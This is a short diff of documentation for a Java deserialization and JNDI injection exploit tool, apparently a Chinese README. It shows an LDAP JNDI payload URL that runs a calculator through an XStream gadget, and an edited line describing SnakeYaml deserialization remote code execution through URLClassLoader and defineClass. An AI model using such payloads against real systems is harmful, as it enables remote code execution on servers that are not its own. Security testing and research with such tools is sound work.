@@ -192,7 +192,7 @@ ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
 
 利用 SnakeYaml 反序列化实现 RCE
 
-反序列化部分使用 URLClassLoader 加载 `javax.script.ScriptEngineManager` SPI 实现类, 内部会通过 ScriptEngine 执行 JS 代码
+反序列化部分使用 URLClassLoader 加载 `javax.script.ScriptEngineManager` SPI 实现类, 内部会调用 defineClass 进行类加载
 
 ```bash
 # SnakeYaml Bypass
